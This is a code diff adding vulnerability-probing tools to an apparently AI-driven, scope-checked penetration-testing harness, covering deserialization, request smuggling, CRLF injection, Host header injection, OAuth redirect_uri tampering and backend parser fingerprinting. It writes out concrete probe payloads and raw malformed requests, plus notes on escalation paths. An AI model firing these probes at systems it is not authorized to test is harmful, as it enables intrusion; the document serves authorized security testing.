+        if (encrypted && !signed.assertion && !signed.response) leads.push("encrypted assertion but NO signature — confidentiality ≠ authenticity; unsigned+encrypted can still be replayed");
+        return txt(
+          JSON.stringify({
+            source,
+            evidenceId: evId,
+            signed,
+            encrypted,
+            sigAlg,
+            digestAlg,
+            issuer,
+            audience,
+            conditions,
+            notBefore,
+            notOnOrAfter,
+            leads,
+            note: leads.length
+              ? "Suspected-class leads — file via record_finding(suspected) with a concrete anomaly and the page/evidenceId. Acceptance (a forged/modified assertion actually logging in) needs a replay oracle this tool deliberately skips."
+              : "SAML response looks well-formed (signed + conditions/audience/expiry present). Nothing to file from passive inspection.",
+          }),
+        );
+      },
+    ),
+    tool(
+      "probe_deser",
+      "Detect whether an endpoint CONSUMES serialized objects — the precondition for a deserialization bug — WITHOUT sending gadget chains. Fires format-specific probes: Java stream magic (AC ED 00 05 + truncated object), PHP O:8:\"VERDICT_NOPE\" (an undefined class name — triggers __PHP_Incomplete_Class/unserialize() warnings), Python pickle protocol-0 referencing a bogus __builtin__ name, .NET BinaryFormatter header bytes. The oracle is the ERROR: StreamCorrupted/ClassNotFoundException, unserialize():, UnpicklingError/ModuleNotFoundError, SerializationException — a format-specific parser error (not a generic 400) proves the input reaches a deserializer → suspected lead + note which format. No signature = inconclusive (silent validation or non-serialized input).",
+      {
+        url: z.string(),
+        method: z.string().optional().describe("default POST"),
+        param: z.string().optional().describe("form field for the serialized blob"),
+        bodyTemplate: z.string().optional().describe("body with {{X}} for the blob (encode per `encode`)"),
+        encode: z.enum(["raw", "url", "base64", "json"]).optional().describe("how the blob embeds — default raw"),
+        formats: z.array(z.enum(["java", "php", "pickle", "dotnet", "ruby", "viewstate"])).optional().describe("subset to try (default all)"),
+        contentType: z.string().optional(),
+      },
+      async ({ url, method, param, bodyTemplate, encode, formats, contentType }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const meth = (method ?? "POST").toUpperCase();
+        const enc = encode ?? "raw";
+        const PROBES: ReadonlyArray<{ fmt: string; data: Buffer; errRe: RegExp; desc: string }> = [
+          { fmt: "java", data: Buffer.from([0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x10, 0x56, 0x45, 0x52, 0x44, 0x49, 0x43, 0x54, 0x5f, 0x4e, 0x4f, 0x50, 0x45]), errRe: /StreamCorruptedException|ClassNotFoundException|InvalidClassException|readObject|ObjectInputStream|invalid stream header/i, desc: "Java ObjectInputStream magic + truncated class" },
+          { fmt: "php", data: Buffer.from('O:13:"VERDICT_NOPE":0:{}'), errRe: /unserialize\(\)|__PHP_Incomplete_Class|allowed_classes|Error at offset/i, desc: "PHP serialized object w/ undefined class" },
+          { fmt: "pickle", data: Buffer.from("c__builtin__\nVERDICT_NOPE\np0\n."), errRe: /UnpicklingError|ModuleNotFoundError|No module named|Can't get attribute|pickle/i, desc: "protocol-0 pickle w/ bogus global" },
+          { fmt: "dotnet", data: Buffer.from([0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), errRe: /SerializationException|BinaryFormatter|End of Stream|unable to read beyond|serialization header/i, desc: ".NET BinaryFormatter header" },
+          { fmt: "ruby", data: Buffer.from("\x04\x08o:\x0fVERDICT_NOPE\x06:\x06ET", "latin1"), errRe: /undefined class|Marshal|marshal data|ArgumentError|incompatible marshal/i, desc: "Ruby Marshal.load object w/ undefined class" },
+          { fmt: "viewstate", data: Buffer.from("/wEPDwULLzEwNTQ0NTM2MWRkVERDICT_NOPE_MAC_TAMPER=="), errRe: /ViewStateException|invalid viewstate|Failed to load viewstate|validation of viewstate|MAC|LosFormatter|ObjectStateFormatter/i, desc: ".NET ViewState blob w/ tampered tail" },
+        ];
+        const subset = new Set(formats ?? PROBES.map((p) => p.fmt));
+        const embed = (data: Buffer): string => {
+          const raw = data.toString("latin1");
+          if (bodyTemplate) {
+            const val = enc === "url" ? encodeURIComponent(raw) : enc === "base64" ? data.toString("base64") : enc === "json" ? data.toString("base64") : raw;
+            return bodyTemplate.split("{{X}}").join(val);
+          }
+          if (param) return `${encodeURIComponent(param)}=${encodeURIComponent(enc === "base64" ? data.toString("base64") : raw)}`;
+          return raw;
+        };
+        const results: Array<{ fmt: string; status: number; evidenceId: string; consumed: boolean; marker?: string }> = [];
+        try {
+          for (const p of PROBES) {
+            if (!subset.has(p.fmt as "java")) continue;
+            const req: HttpRequest = { method: meth, url, headers: { ...authHeaders(s), "content-type": contentType ?? (param ? "application/x-www-form-urlencoded" : "application/octet-stream") }, body: embed(p.data) };
+            const res = await s.http.send(req);
+            bumpHttp(s, res.status);
+            const ev = s.evidence.record({
+              screenId: s.currentScreenId ?? "pilot",
+              validator: "claude-pilot-deser",
+              kind: "positive_replay",
+              request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false), body: `[${p.desc}]` },
+              response: res,
+              note: `deser-probe ${p.fmt}`,
+            });
+            const m = p.errRe.exec(res.body);
+            results.push({ fmt: p.fmt, status: res.status, evidenceId: ev.id, consumed: Boolean(m), marker: m?.[0] });
+          }
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_deser failed: ${String(e).slice(0, 200)}` }));
+        }
+        const hits = results.filter((r) => r.consumed);
+        return txt(
+          JSON.stringify({
+            verdict: hits.length ? "CONSUMES-SERIALIZED" : "INCONCLUSIVE",
+            results,
+            note: hits.length
+              ? `${hits.map((h) => h.fmt).join(",")} produced a format-specific deserializer error — the endpoint feeds the blob to a deserializer. This is a SUSPECTED lead (deserialization-attack precondition): the next step is a gadget chain appropriate to the stack (see backend-lib guesses), NOT this tool's scope. record_finding(suspected) citing the evidenceId(s).`
+              : "no format-specific deserializer error — the input is either validated upstream, parsed as another format, or silently dropped. Inconclusive, not clean.",
+          }),
+        );
+      },
+    ),
+    tool(
+      "probe_smuggling",
+      "Detect HTTP REQUEST SMUGGLING potential (front-end/back-end CL-vs-TE disagreement) using a SAFE timeout oracle — no queue poisoning: probes either form complete requests or just hang; no stray bytes are ever left on the socket. Requires a front-end/CDN situation to matter. Legs: control (plain POST must respond), P1 (CL=5 + TE:chunked + exactly 5 bytes — a 400/reject means dual headers are hardened), then two ambiguity probes — P2 'CL overstates' (CL:6 + 5 sent: hangs if EITHER end uses CL) and P3 'CL understates' (CL:4 + 4 sent: hangs if EITHER end uses TE). BOTH probes timing out = the two ends disagree = SUSPECTED-DESYNC (suspected lead only — distinguishing CL.TE vs TE.CL and impact proof require queue interaction we deliberately skip). Exactly one timeout = consistent parsing = no desync. Use the real origin URL; results through an HTTP proxy are meaningless for desync.",
+      {
+        url: z.string(),
+        timeoutMs: z.number().optional().describe("response window per probe (default 4000; the probe waits this long before calling it a hang)"),
+      },
+      async ({ url, timeoutMs }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        let u: URL;
+        try {
+          u = new URL(url);
+        } catch {
+          return txt(JSON.stringify({ error: `bad url: ${url}` }));
+        }
+        const timeout = Math.max(1500, Math.min(15000, timeoutMs ?? 4000));
+        const mk = (extra: string, cl: number | null, body: string) =>
+          `POST ${u.pathname || "/"}${u.search} HTTP/1.1\r\nHost: ${u.host}\r\nUser-Agent: VERDICT-desync-probe\r\nConnection: keep-alive\r\n${extra}${cl === null ? "" : `Content-Length: ${cl}\r\n`}\r\n${body}`;
+        const reqs: Array<{ tag: string; raw: string; kind: "negative_control" | "positive_replay" }> = [
+          { tag: "control plain POST", raw: mk("Content-Type: application/x-www-form-urlencoded\r\n", 0, ""), kind: "negative_control" },
+          { tag: "P1 consistency dual-headers (CL=5, 5 sent)", raw: mk("Transfer-Encoding: chunked\r\n", 5, "0\r\n\r\n"), kind: "negative_control" },
+          { tag: "P2 CL overstates (CL=6, 5 sent)", raw: mk("Transfer-Encoding: chunked\r\n", 6, "0\r\n\r\n"), kind: "positive_replay" },
+          { tag: "P3 CL understates (CL=4, 4 sent)", raw: mk("Transfer-Encoding: chunked\r\n", 4, "0\r\n\r"), kind: "positive_replay" },
+        ];
+        const legs: Array<{ tag: string; status: number; timedOut: boolean; evidenceId: string; error?: string }> = [];
+        for (const p of reqs) {
+          const r = await rawHttpProbe({ url, raw: p.raw, timeoutMs: timeout });
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-smuggling",
+            kind: p.kind,
+            request: { method: "POST", url, headers: { "content-type": "application/octet-stream" }, body: p.raw },
+            response: { status: r.status, finalUrl: url, durationMs: 0, headers: {}, body: r.responseHead || (r.error ?? ""), truncated: false },
+            note: `desync ${p.tag}${r.timedOut ? " (TIMED OUT)" : ""}`,
+          });
+          legs.push({ tag: p.tag, status: r.status, timedOut: r.timedOut, evidenceId: ev.id, ...(r.error ? { error: r.error } : {}) });
+        }
+        const [ctrl, p1, p2, p3] = legs;
+        const p1Rejected = p1 !== undefined && p1.status >= 400 && p1.status < 500 && !p1.timedOut;
+        if (!ctrl || ctrl.timedOut || ctrl.status === 0) {
+          return txt(JSON.stringify({ verdict: "INCONCLUSIVE", legs, reason: "control request itself produced no clean response — the raw socket path is unusable here (proxy, H2-only, TLS). Not a desync signal." }));
+        }
+        if (p1Rejected) {
+          return txt(JSON.stringify({ verdict: "HARDENED", legs, reason: `P1 dual-header request rejected with ${p1!.status} — the front-end/app refuses conflicting CL/TE. Desync is blocked at intake.` }));
+        }
+        const verdict = p2!.timedOut && p3!.timedOut ? "SUSPECTED-DESYNC" : "CONSISTENT";
+        return txt(
+          JSON.stringify({
+            verdict,
+            legs,
+            note:
+              verdict === "SUSPECTED-DESYNC"
+                ? `both ambiguity probes hung (${p2!.evidenceId}, ${p3!.evidenceId}) while the control answered — front-end and back-end disagree on message length. SUSPECTED only: confirming CL.TE vs TE.CL and showing impact requires queue-interaction probes that risk poisoning other users — do NOT attempt without explicit authorization; file as suspected with this evidence.`
+                : p2!.timedOut !== p3!.timedOut
+                  ? `one probe hung (${p2!.timedOut ? "P2" : "P3"}) — consistent CL.CL or TE.TE parsing; this is the NORMAL result, not a lead.`
+                  : "neither probe hung — both ends parse the ambiguous framing the same way. No desync on this path.",
+          }),
+        );
+      },
+    ),
+    tool(
+      "probe_crlf",
+      "Detect CRLF INJECTION / response splitting: a parameter (or path segment) value containing %0d%0a<HeaderName>: <marker> must NOT surface as a real response header or a split body line. Legs: control (plain value — marker absent) + encoded probes (%0d%0a, %0a-only, Unicode overlong %e5%98%8a%e5%98%8d used against lenient decoders) carrying a unique X-VCrlf header. Marker appearing as a parsed response header or a leading body line in ≥2 variants → CONFIRMED crlf-injection (leads to header injection, cookie forcing, XSS via split body). Reflected in the BODY only as text = plain reflection, not splitting.",
+      {
+        url: z.string().describe("endpoint; {{X}} inside the URL marks the injection point — default appends ?vcr=…"),
+        param: z.string().optional().describe("query param name to inject into (default: use {{X}} placeholder or vcr)"),
+      },
+      async ({ url, param }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const tok = `vcr${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
+        const inject = (enc: string) =>
+          url.includes("{{X}}")
+            ? url.replace("{{X}}", enc)
+            : `${url}${url.includes("?") ? "&" : "?"}${encodeURIComponent(param ?? "vcr")}=${enc}`;
+        const send = async (u: string, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req: HttpRequest = { method: "GET", url: u, headers: authHeaders(s), body: null };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-crlf",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+            response: res,
+            note: `crlf ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body, headers: res.headers };
+        };
+        const split = (r: { body: string; headers: Record<string, string> }): boolean => {
+          const hdrHit = Object.entries(r.headers).some(([k, v]) => k.toLowerCase() === "x-vcrlf" && v.includes(tok));
+          // Splitting can also push the injected line into the body head.
+          const bodyHit = r.body.slice(0, 400).includes(`X-VCrlf: ${tok}`) || r.body.slice(0, 400).includes(`x-vcrlf: ${tok}`);
+          return hdrHit || bodyHit;
+        };
+        try {
+          const control = await send(inject("plain"), "negative_control", "control");
+          if (split(control)) return txt(JSON.stringify({ verdict: "UNVERIFIED", reason: "control itself reflects an x-vcrlf header — can't claim injection", control: control.evId }));
+          const variants = [
+            { tag: "crlf-encoded", val: `%0d%0aX-VCrlf:%20${tok}` },
+            { tag: "lf-only", val: `%0aX-VCrlf:%20${tok}` },
+            { tag: "unicode-overlong", val: `%e5%98%8a%e5%98%8dX-VCrlf:%20${tok}` },
+          ];
+          const legs: Array<{ tag: string; status: number; evidenceId: string; split: boolean; headerName?: string }> = [];
+          for (const v of variants) {
+            const r = await send(inject(v.val), "positive_replay", v.tag);
+            legs.push({ tag: v.tag, status: r.status, evidenceId: r.evId, split: split(r) });
+          }
+          const hits = legs.filter((l) => l.split);
+          if (hits.length >= 2) {
+            return txt(
+              JSON.stringify({
+                category: "crlf-injection",
+                verdict: "CONFIRMED",
+                legs,
+                negativeControl: control.evId,
+                positiveReplays: hits.slice(0, 2).map((h) => h.evidenceId),
+                effectMarker: `injected X-VCrlf: ${tok} surfaced as a response header/split line`,
+                note: "record_finding(category:'crlf-injection', endpoint, param) — CRLF injection confirmed across ≥2 encodings; response splitting → arbitrary headers, forced cookies, or reflected body.",
+              }),
+            );
+          }
+          return txt(
+            JSON.stringify({ verdict: hits.length === 1 ? "UNVERIFIED" : "CLEAN-HERE", control: control.evId, legs, reason: hits.length === 1 ? "only one encoding split — needs a second independent variant to confirm" : "no encoding split the response — CRLF is sanitized on this surface." }),
+          );
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_crlf failed: ${String(e).slice(0, 200)}` }));
+        }
+      },
+    ),
+    tool(
+      "probe_host_header",
+      "Detect HOST HEADER trust problems beyond reset poisoning: many apps build absolute URLs / canonical links / reset links from the request's Host (or X-Forwarded-Host) — an injected host that echoes back means cache poisoning vectors, reset-link hijack, or password-link poisoning. Uses a RAW SOCKET because fetch/undici cannot override Host. Legs: control (real Host, marker absent) + variants — Host: <marker>, X-Forwarded-Host: <marker>, and an absolute-form request-target GET http://<marker>/path. Marker reflected in ≥2 variant responses while absent in control → CONFIRMED host-header reflection (file as info-disclosure/host-header-injection with the reflection location).",
+      {
+        url: z.string(),
+        timeoutMs: z.number().optional(),
+      },
+      async ({ url, timeoutMs }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        let u: URL;
+        try {
+          u = new URL(url);
+        } catch {
+          return txt(JSON.stringify({ error: `bad url: ${url}` }));
+        }
+        const tok = `vhh${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
+        const marker = `${tok}.verdict.example`;
+        const timeout = Math.max(1000, Math.min(10000, timeoutMs ?? 5000));
+        const head = (extra: string, target = `${u.pathname || "/"}${u.search}`) =>
+          `GET ${target} HTTP/1.1\r\nHost: ${u.host}\r\nUser-Agent: VERDICT-host-probe\r\nAccept: */*\r\nConnection: close\r\n${extra}\r\n`;
+        const variants: Array<{ tag: string; raw: string; kind: "negative_control" | "positive_replay" }> = [
+          { tag: "control real host", raw: head(""), kind: "negative_control" },
+          { tag: "host override", raw: head("").replace(`Host: ${u.host}`, `Host: ${marker}`), kind: "positive_replay" },
+          { tag: "x-forwarded-host", raw: head(`X-Forwarded-Host: ${marker}\r\n`), kind: "positive_replay" },
+          { tag: "absolute-form target", raw: head("", `http://${marker}${u.pathname || "/"}${u.search}`), kind: "positive_replay" },
+        ];
+        const legs: Array<{ tag: string; status: number; evidenceId: string; reflected: boolean }> = [];
+        for (const v of variants) {
+          const r = await rawHttpProbe({ url, raw: v.raw, timeoutMs: timeout, bodyCapBytes: 8192 });
+          const reflected = r.responseHead.includes(marker) || r.body.includes(marker);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-hosthdr",
+            kind: v.kind,
+            request: { method: "GET", url, headers: { host: v.raw.match(/^Host: (.*)$/m)?.[1]?.trim() ?? u.host }, body: v.raw },
+            response: { status: r.status, finalUrl: url, durationMs: 0, headers: {}, body: `${r.responseHead}${r.body}` || (r.error ?? ""), truncated: false },
+            note: `hosthdr ${v.tag}${reflected ? " (marker reflected)" : ""}`,
+          });
+          legs.push({ tag: v.tag, status: r.status, evidenceId: ev.id, reflected });
+        }
+        const [ctrl, ...rest] = legs;
+        const hits = rest.filter((l) => l.reflected);
+        if (ctrl!.reflected) {
+          return txt(JSON.stringify({ verdict: "UNVERIFIED", legs, reason: "control already contains the marker — reflection is not attributable to the injected host" }));
+        }
+        if (hits.length >= 2) {
+          return txt(
+            JSON.stringify({
+              category: "host-header-injection",
+              verdict: "CONFIRMED",
+              legs,
+              negativeControl: ctrl!.evidenceId,
+              positiveReplays: hits.slice(0, 2).map((h) => h.evidenceId),
+              effectMarker: `injected host ${marker} reflected in the response head`,
+              note: "record_finding(category:'host-header-injection', endpoint) — the app trusts request-supplied host values; escalate path: password-reset poisoning, cache poisoning, SSRF-via-Host on internal vhosts.",
+            }),
+          );
+        }
+        return txt(
+          JSON.stringify({ verdict: hits.length === 1 ? "UNVERIFIED" : "CLEAN-HERE", legs, reason: hits.length === 1 ? "single variant reflected — needs a second independent vector" : "injected host never surfaced — Host handling looks sane on this endpoint." }),
+        );
+      },
+    ),
+    tool(
+      "probe_oauth",
+      "Audit an OAuth/OIDC authorization URL for the classic flow weaknesses. Pass the FULL /authorize URL (with client_id/redirect_uri/response_type/scope). Checks WITHOUT extra traffic: missing `state` (login-CSRF), implicit `response_type=token`/`id_token token` (token in URL fragment → log/referrer leakage), missing `nonce` on implicit/hybrid. Then redirect_uri tampering legs (redirects are NOT followed — we only read the 302 Location): a foreign host, a domain-suffix append (legit.com.evil.invalid), a userinfo trick (legit.com@evil), a path-traversal append, and a plain HTTP downgrade. If ≥2 tampered URIs produce a 3xx whose Location points at our marker host, the AS accepts arbitrary redirect_uris → CONFIRMED oauth-redirect-uri (auth-code/id_token would leak to an attacker). All-rejected → the AS validates the URI (clean). Login-required responses mean the check can't see the final redirect — UNVERIFIED, not clean.",
+      {
+        authorizeUrl: z.string().describe("the full authorize URL as observed (e.g. https://app/authorize?client_id=..&redirect_uri=..&response_type=code&scope=..)"),
+      },
+      async ({ authorizeUrl }) => {
+        if (!isInScope(authorizeUrl, s.scope)) return txt(`BLOCKED: ${authorizeUrl} is out of scope`);
+        let u: URL;
+        try {
+          u = new URL(authorizeUrl);
+        } catch {
+          return txt(JSON.stringify({ error: `bad url: ${authorizeUrl}` }));
+        }
+        const rt = u.searchParams.get("response_type") ?? "";
+        const staticLeads: string[] = [];
+        if (!u.searchParams.has("state")) staticLeads.push("no `state` param — login-CSRF risk (attacker-injected account binding); suspected lead");
+        if (/\btoken\b|\bid_token\b/.test(rt)) staticLeads.push(`implicit response_type '${rt}' — credential travels in the URL fragment (logs/referrer/history exposure)`);
+        if (/\btoken\b|\bid_token\b/.test(rt) && !u.searchParams.has("nonce")) staticLeads.push("implicit/hybrid flow without `nonce` — replay/mix-up risk");
+        const origRu = u.searchParams.get("redirect_uri");
+        if (!origRu) {
+          return txt(JSON.stringify({ verdict: "UNVERIFIED", staticLeads, reason: "no redirect_uri param in the URL — tampering needs the registered URI to mutate" }));
+        }
+        const tok = `vo${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
+        const evil = `${tok}.verdict.invalid`;
+        let legitHost = "";
+        try { legitHost = new URL(origRu).host; } catch { /* relative */ }
+        const variants: Array<{ tag: string; ru: string }> = [
+          { tag: "foreign host", ru: `https://${evil}/cb` },
+          { tag: "domain-suffix append", ru: legitHost ? `https://${legitHost}.${evil}/cb` : `https://x.${evil}/cb` },
+          { tag: "userinfo trick", ru: legitHost ? `https://${legitHost}@${evil}/cb` : `https://x@${evil}/cb` },
+          { tag: "path append", ru: `${origRu}.invalid-path/../cb` },
+          { tag: "http downgrade", ru: legitHost ? `http://${legitHost}${new URL(origRu).pathname || "/"}` : `http://${evil}/cb` },
+        ];
+        const locOf = (r: { headers: Record<string, string> }): string | null => r.headers["location"] ?? r.headers["Location"] ?? null;
+        const send = async (ru: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
+          const uu = new URL(authorizeUrl);
+          if (ru === null) uu.searchParams.delete("redirect_uri");
+          else uu.searchParams.set("redirect_uri", ru);
+          const req: HttpRequest = { method: "GET", url: uu.toString(), headers: authHeaders(s), body: null };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-oauth",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
+            response: res,
+            note: `oauth ${tag}`,
+          });
+          const loc = locOf(res);
+          return { evId: ev.id, status: res.status, location: loc, toEvil: loc ? loc.includes(evil) : false };
+        };
+        const legs: Array<{ tag: string; status: number; location: string | null; toEvil: boolean; evidenceId: string }> = [];
+        try {
+          const control = await send(origRu, "negative_control", "control legit redirect_uri");
+          legs.push({ tag: "control", status: control.status, location: control.location, toEvil: control.toEvil, evidenceId: control.evId });
+          for (const v of variants) {
+            const r = await send(v.ru, "positive_replay", `tampered ${v.tag}`);
+            legs.push({ tag: v.tag, status: r.status, location: r.location, toEvil: r.toEvil, evidenceId: r.evId });
+          }
+        } catch (e) {
+          return txt(JSON.stringify({ error: `probe_oauth failed: ${String(e).slice(0, 200)}` }));
+        }
+        const hits = legs.filter((l) => l.toEvil);
+        const loginGated = legs.every((l) => l.location === null || /login|signin|auth/i.test(l.location));
+        if (hits.length >= 2) {
+          return txt(
+            JSON.stringify({
+              category: "oauth-misconfig",
+              verdict: "CONFIRMED",
+              staticLeads,
+              negativeControl: legs[0]!.evidenceId,
+              positiveReplays: hits.slice(0, 2).map((h) => h.evidenceId),
+              effectMarker: `authorize endpoint 3xx-redirects to attacker URI ${evil} with a tampered redirect_uri`,
+              note: "record_finding(category:'oauth-misconfig', endpoint) — AS accepts unregistered redirect_uri → auth code/token leaks to an attacker host. Cite the Location targets in the finding.",
+            }),
+          );
+        }
+        if (loginGated) {
+          return txt(JSON.stringify({ verdict: "UNVERIFIED", staticLeads, legs, reason: "every response redirects to a login page — the redirect_uri decision is behind auth; the Location of the control leg can't reveal validation. Re-run with an authenticated session or check whether the AS defers URI validation until post-login." }));
+        }
+        return txt(
+          JSON.stringify({
+            verdict: hits.length === 1 ? "UNVERIFIED" : "CLEAN-HERE",
+            staticLeads,
+            legs,
+            reason: hits.length === 1 ? "one tampered URI redirected to the marker — needs a second variant" : "all tampered redirect_uris were rejected/errored — the AS validates the URI against its registry on this flow.",
+          }),
+        );
+      },
+    ),
+    tool(
+      "probe_parser",
+      "Identify the BACKEND LIBRARY stack behind a suspected file/media/processing endpoint for n-day hunting. Sends BENIGN malformed inputs only (truncated JPEG/PNG/WebP magic, corrupt ZIP/PDF headers, malformed XML — nothing exploit-shaped) as multipart uploads, then reads the error responses for parser/codec/module signatures (stack traces, 'PIL.UnidentifiedImageError', 'ImageMagick delegate failed', node_modules paths). Output = backend-lib GUESSES per input that elicited them; a guess is a lead, not a confirmed install — chase a version (error pages, lockfiles) before cve_lookup. Point it ONLY at endpoints that plausibly parse files (upload/import/convert/avatar/attachment/preview/parse/thumbnail paths); other POST targets are refused unless you pass force:true.",
+      {
+        urls: z.array(z.string()).describe("in-scope upload/parse endpoints to elicit parser errors from. 1–3."),
+        field: z.string().optional().describe("multipart file field name (default: file)"),
+        force: z.boolean().optional().describe("send even when a URL does not look like a file-processing endpoint"),
+      },
+      async ({ urls, field, force }) => {
+        const fileField = (field?.trim() || "file").trim();
+        const UPLOADISH = /upload|media|image|img|avatar|photo|file|import|convert|parse|thumbnail|preview|attach|document|doc|pdf|compress|resize|ocr|scan/i;
+        // Benign parser-error elicitors — truncated/corrupt container stubs. No exploit payload.
+        const PROBES: ReadonlyArray<{ tag: string; filename: string; contentType: string; data: Buffer }> = [
+          { tag: "trunc-jpeg", filename: "p.jpg", contentType: "image/jpeg", data: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]) },
+          { tag: "corrupt-png", filename: "p.png", contentType: "image/png", data: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]) },
+          { tag: "trunc-webp", filename: "p.webp", contentType: "image/webp", data: Buffer.concat([Buffer.from("RIFF"), Buffer.alloc(4), Buffer.from("WEBPVP8 ")]) },
+          { tag: "corrupt-zip", filename: "p.zip", contentType: "application/zip", data: Buffer.concat([Buffer.from("PK\x03\x04"), Buffer.alloc(14, 0x41)]) },
+          { tag: "corrupt-pdf", filename: "p.pdf", contentType: "application/pdf", data: Buffer.from("%PDF-1.7\n%\xe2\xe3\xcf\xd3\ngarbage") },
+          { tag: "malformed-xml", filename: "p.xml", contentType: "application/xml", data: Buffer.from("<?xml version=\"1.0\"?><a><b></a>") },
+        ];
+        const out: Array<{ url: string; sends: Array<{ tag: string; status: number; evidenceId: string; libs: string[] }>; libs: TechComponent[]; note?: string }> = [];
+        for (const url of urls.slice(0, 3)) {
+          if (!isInScope(url, s.scope)) { out.push({ url, sends: [], libs: [], note: "out of scope" }); continue; }
+          const path = (() => { try { return new URL(url).pathname; } catch { return url; } })();
+          if (!force && !UPLOADISH.test(path)) {
+            out.push({ url, sends: [], libs: [], note: "URL does not look like a file-processing endpoint — pass force:true to send anyway" });
+            continue;
+          }
+          const sends: Array<{ tag: string; status: number; evidenceId: string; libs: string[] }> = [];
+          const libAcc = new Map<string, TechComponent>();
+          for (const p of PROBES) {
+            const req: HttpRequest = {
+              method: "POST",
+              url,
+              headers: authHeaders(s),
+              body: null,
+              multipart: { files: [{ name: fileField, filename: p.filename, contentType: p.contentType, base64: p.data.toString("base64") }] },
+            };
+            let res: HttpResponse;
+            try {
+              res = await s.http.send(req);
+            } catch (e) {
+              sends.push({ tag: p.tag, status: 0, evidenceId: "", libs: [`send failed: ${String(e).slice(0, 60)}`] });
+              continue;
+            }
+            bumpHttp(s, res.status);
+            const ev = s.evidence.record({
+              screenId: s.currentScreenId ?? "pilot",
+              validator: "claude-pilot-parser",
+              kind: "positive_replay",
+              request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false), body: `[multipart] ${p.filename} (${p.tag}, ${p.data.length}B corrupt)` },
+              response: res,
+              note: `parser-probe ${p.tag}`,
+            });
+            const hits = extractBackendLibs(res.body);
+            for (const h of hits) {
+              const key = `${h.name.toLowerCase()}|${h.version ?? ""}`;
+              if (!libAcc.has(key)) libAcc.set(key, h);
+            }
+            sends.push({ tag: p.tag, status: res.status, evidenceId: ev.id, libs: hits.map((h) => (h.version ? `${h.name} ${h.version}` : h.name)) });
+          }
+          out.push({ url, sends, libs: [...libAcc.values()] });
+        }
+        const totalLibs = out.reduce((n, o) => n + o.libs.length, 0);
+        return txt(
+          JSON.stringify({
+            results: out,
+            summary: totalLibs === 0 ? "no backend-lib signatures elicited (silent parser, generic error handler, or non-file endpoint)" : `${totalLibs} backend-lib guess(es) from ${out.length} endpoint(s)`,
+            note: "Each 'libs' entry came from one malformed input — see 'sends[].libs' for which elicitor produced it. These are GUESSES: use them to aim n-day classes (see backendLibHints in fingerprint_scan) and to target version discovery. A versioned hit → cve_lookup (kind 'backend-lib'). No signatures ≠ clean — the parser may swallow errors silently.",
+          }),
+        );
+      },
+    ),
+    tool(
       "fingerprint_scan",
-      "Fetch one or more in-scope URLs and extract the technology stack from their response headers, cookies, <meta generator> and <script src> (web server, language, framework, CMS, frontend libraries) with versions where available. Known-vulnerable JS library versions are flagged automatically; assess the rest against your own CVE knowledge. Start with the site root and a couple of representative pages / the main JS bundle.",
+      "Fetch one or more in-scope URLs and extract the technology stack from their response headers, cookies, <meta generator> and <script src> (web server, language, framework, CMS, frontend libraries) with versions where available. ALSO guesses backend libraries (image/doc parsers, serialization stacks, template engines, ORMs, infra internals) from body signals in the fetched pages AND in response bodies already recorded in evidence — stack traces, module paths, framework error pages, lockfile fragments — for n-day hunting; guesses are leads, not confirmed installs. Known-vulnerable JS library versions are flagged automatically; assess the rest against your own CVE knowledge. Start with the site root and a couple of representative pages / the main JS bundle.",
       { urls: z.array(z.string()).describe("in-scope URLs to fetch & fingerprint (e.g. the root, a JS bundle). 1–12.") },
       async ({ urls }) => {
         const samples: TechSample[] = [];
@@ -3816,12 +5814,33 @@ export function buildTools(s: PilotSession) {
           }
         }
         const components = fingerprintTech(samples);
+        // Backend-library guesses — scan the freshly fetched bodies AND the bodies already sitting
+        // in recorded evidence (probe error responses often leak stack traces / module paths).
+        // Zero extra sends: every recorded body is already in memory.
+        const backendLibs = new Map<string, TechComponent & { evidenceRef?: string }>();
+        const addLib = (c: TechComponent, ref?: string) => {
+          const key = `${c.name.toLowerCase()}|${c.version ?? ""}`;
+          const cur = backendLibs.get(`${c.name.toLowerCase()}|`);
+          if (c.version && cur) backendLibs.delete(`${c.name.toLowerCase()}|`);
+          if (!backendLibs.has(key)) backendLibs.set(key, { ...c, evidenceRef: ref });
+        };
+        for (const sample of samples) for (const c of extractBackendLibs(sample.body)) addLib(c);
+        const evRecords = s.evidence.records.slice(-200);
+        for (const rec of evRecords) {
+          const body = rec.response?.body;
+          if (!body || typeof body !== "string") continue;
